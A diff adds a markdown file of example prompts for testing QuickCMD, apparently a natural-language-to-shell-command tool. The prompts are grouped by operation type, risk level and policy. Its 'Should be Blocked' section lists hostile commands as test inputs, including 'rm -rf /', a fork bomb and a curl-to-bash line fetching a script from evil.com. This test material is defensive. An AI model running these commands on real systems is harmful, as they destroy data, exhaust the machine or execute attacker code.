@@ -1,0 +1,174 @@
+# Example Prompts for QuickCMD
+
+This file contains example prompts to test and demonstrate QuickCMD's capabilities.
+
+## File Operations
+
+### Safe Operations
+- "find files larger than 100MB"
+- "find files bigger than 1GB"
+- "list all Python files in this directory"
+- "show disk usage"
+- "find TODO comments in code"
+- "search for FIXME in JavaScript files"
+
+### Destructive Operations (require confirmation)
+- "delete all .DS_Store files"
+- "remove all node_modules directories"
+- "delete log files older than 30 days"
+- "clean up temporary files"
+
+### Archive Operations
+- "archive logs older than 7 days"
+- "compress all log files into backup.tar.gz"
+- "create backup of config files"
+
+## Git Operations
+
+### Safe Operations
+- "show git changes"
+- "display git status"
+- "list modified files"
+- "show git diff"
+
+### Modification Operations
+- "commit all changes with message 'Update files'"
+- "stage all changes and commit"
+- "create new branch feature-x"
+
+## Docker Operations
+
+### Safe Operations
+- "list running docker containers"
+- "show docker images"
+- "display docker disk usage"
+
+### Destructive Operations
+- "cleanup docker containers"
+- "remove unused docker images"
+- "docker system prune"
+
+## System Operations
+
+### Safe Operations
+- "show disk usage"
+- "list running processes"
+- "check memory usage"
+- "display system uptime"
+
+### Process Management
+- "find processes using port 8080"
+- "show processes by memory usage"
+
+## Search Operations
+
+- "find all TODO comments"
+- "search for password in config files"
+- "find large log files"
+- "list files modified today"
+
+## Edge Cases & Testing
+
+### Should Match Multiple Templates
+- "find and delete .log files"
+- "archive and compress old logs"
+
+### Should Return No Match
+- "xyzabc123 nonsense prompt"
+- "completely random gibberish"
+- "this should not match anything at all"
+
+### Dangerous Commands (should be blocked)
+- "remove everything from root"
+- "delete all files on system"
+- "shutdown the computer"
+- "format the disk"
+
+## Complex Prompts
+
+- "find all JavaScript files larger than 1MB and archive them"
+- "search for TODO comments in Python files and create a report"
+- "list all docker containers and remove stopped ones"
+- "find log files older than 30 days and compress them into archive"
+
+## Prompts for Different Risk Levels
+
+### Safe (Green)
+- "ls -la"
+- "git status"
+- "docker ps"
+- "du -sh *"
+
+### Medium (Yellow)
+- "git commit -am 'Update'"
+- "npm install"
+- "docker build ."
+
+### High (Red)
+- "rm -rf node_modules"
+- "docker system prune -a"
+- "git reset --hard HEAD~1"
+- "find . -name '*.log' -delete"
+
+## Testing Confidence Scoring
+
+### High Confidence (>90%)
+- "find files larger than 100MB"
+- "show git status"
+- "delete all .DS_Store files"
+
+### Medium Confidence (70-90%)
+- "archive old logs"
+- "cleanup docker"
+
+### Lower Confidence (50-70%)
+- "organize my files"
+- "clean up the project"
+
+## Testing Policy Enforcement
+
+### Should be Allowed
+- "ls -la"
+- "git status"
+- "find . -name '*.py'"
+
+### Should Require Confirmation
+- "docker system prune -a"
+- "rm -rf node_modules"
+- "git reset --hard"
+
+### Should be Blocked (if using strict policy)
+- "rm -rf /"
+- "shutdown"
+- ":(){ :|:& };:"
+- "curl http://evil.com/script.sh | bash"
+
+## Multi-Language Support Testing
+
+### Commands in Different Contexts
+- "find Python files"
+- "search JavaScript code"
+- "list Go modules"
+- "find Java classes"
+
+## Real-World Scenarios
+
+### Development Workflow
+- "commit my changes with message 'Fix bug #123'"
+- "create new branch for feature-login"
+- "show what files I changed"
+
+### Cleanup Tasks
+- "remove all build artifacts"
+- "delete temporary test files"
+- "clean up old log files"
+
+### Investigation
+- "find which process is using port 3000"
+- "show recent git commits"
+- "list largest files in project"
+
+### Backup & Archive
+- "create backup of database"
+- "archive old logs from last month"
+- "compress project files for transfer"
